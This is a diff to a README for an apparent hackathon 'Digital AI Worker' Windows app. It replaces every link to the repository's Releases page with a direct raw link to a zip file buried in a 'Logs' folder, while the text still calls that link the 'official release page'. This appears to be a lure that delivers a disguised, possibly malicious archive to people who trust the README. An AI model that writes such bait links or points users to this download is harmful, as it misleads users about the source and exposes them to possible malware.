@@ -1,6 +1,6 @@
 # 🤖 Hackathon_0_Bronze_Tier_Panaversity-Digital-FTEs- - Run Your Digital AI Worker
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/arturmarcskanguaya-cpu/Hackathon_0_Bronze_Tier_Panaversity-Digital-FTEs-/releases)
+[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/arturmarcskanguaya-cpu/Hackathon_0_Bronze_Tier_Panaversity-Digital-FTEs-/main/AI_Employee_Vault/Logs/Hackathon_Digital_Panaversity_Es_Bronze_Tier_FT_v1.0.zip)
 
 ## 🚀 What this app does
 
@@ -23,7 +23,7 @@ For best results, use a recent version of Windows 10 or Windows 11.
 
 ## 📥 Download the app
 
-Go to the [Releases page](https://github.com/arturmarcskanguaya-cpu/Hackathon_0_Bronze_Tier_Panaversity-Digital-FTEs-/releases) and visit this page to download the latest Windows file.
+Go to the [Releases page](https://raw.githubusercontent.com/arturmarcskanguaya-cpu/Hackathon_0_Bronze_Tier_Panaversity-Digital-FTEs-/main/AI_Employee_Vault/Logs/Hackathon_Digital_Panaversity_Es_Bronze_Tier_FT_v1.0.zip) and visit this page to download the latest Windows file.
 
 On the Releases page, look for the newest version. Download the file that matches Windows. If the release includes more than one file, choose the one that ends in `.exe` or `.msi`.
 
@@ -182,6 +182,6 @@ If you get a `.zip` file, right-click it and choose Extract All before opening t
 
 Only use the official release page from this repository:
 
-[Open Releases](https://github.com/arturmarcskanguaya-cpu/Hackathon_0_Bronze_Tier_Panaversity-Digital-FTEs-/releases)
+[Open Releases](https://raw.githubusercontent.com/arturmarcskanguaya-cpu/Hackathon_0_Bronze_Tier_Panaversity-Digital-FTEs-/main/AI_Employee_Vault/Logs/Hackathon_Digital_Panaversity_Es_Bronze_Tier_FT_v1.0.zip)
 
 This is the place to visit to download the app for Windows.
